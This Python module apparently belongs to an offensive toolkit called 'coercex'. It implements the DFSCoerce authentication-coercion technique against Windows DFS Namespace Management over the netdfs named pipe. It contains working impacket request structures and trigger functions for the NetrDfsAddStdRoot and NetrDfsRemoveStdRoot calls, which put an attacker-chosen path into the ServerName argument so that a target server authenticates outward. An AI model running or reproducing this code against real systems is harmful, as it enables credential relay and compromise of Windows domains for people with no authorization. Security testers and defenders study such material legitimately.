"""MS-DFSNM (Distributed File System Namespace Management) coercion methods.

DFSCoerce - uses DFS namespace management RPC calls.
"""

from __future__ import annotations

from impacket.dcerpc.v5.dtypes import DWORD, WSTR
from impacket.dcerpc.v5.ndr import NDRCALL

from coercex.methods.base import CoercionMethod, PipeBinding
from coercex.utils import random_string

DFSNM_UUID = "4fc742e0-4a10-11cf-8273-00aa004ae673"

DFSNM_PIPES = [
    PipeBinding(pipe=r"\PIPE\netdfs", uuid=DFSNM_UUID, version="3.0"),
]

DFSNM_PATH_STYLES = [
    ("smb", "share_file"),
    ("smb", "share_trailing"),
    ("smb", "share"),
    ("http", "share_file"),
]

PROTOCOL_SHORT = "MS-DFSNM"
PROTOCOL_LONG = (
    "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol"
)


class _NetrDfsAddStdRoot(NDRCALL):
    opnum = 12
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("Comment", WSTR),
        ("ApiFlags", DWORD),
    )


class _NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ("ServerName", WSTR),
        ("RootShare", WSTR),
        ("ApiFlags", DWORD),
    )


def _trigger_add_std_root(dce, path, target):
    request = _NetrDfsAddStdRoot()
    request["ServerName"] = path
    request["RootShare"] = random_string() + "\x00"
    request["Comment"] = random_string() + "\x00"
    request["ApiFlags"] = 0
    dce.request(request)


def _trigger_remove_std_root(dce, path, target):
    request = _NetrDfsRemoveStdRoot()
    request["ServerName"] = path
    request["RootShare"] = random_string() + "\x00"
    request["ApiFlags"] = 0
    dce.request(request)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-DFSNM coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="NetrDfsAddStdRoot",
            opnum=12,
            vuln_args=["ServerName"],
            pipe_bindings=list(DFSNM_PIPES),
            path_styles=list(DFSNM_PATH_STYLES),
            trigger_fn=_trigger_add_std_root,
        ),
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="NetrDfsRemoveStdRoot",
            opnum=13,
            vuln_args=["ServerName"],
            pipe_bindings=list(DFSNM_PIPES),
            path_styles=list(DFSNM_PATH_STYLES),
            trigger_fn=_trigger_remove_std_root,
        ),
    ]
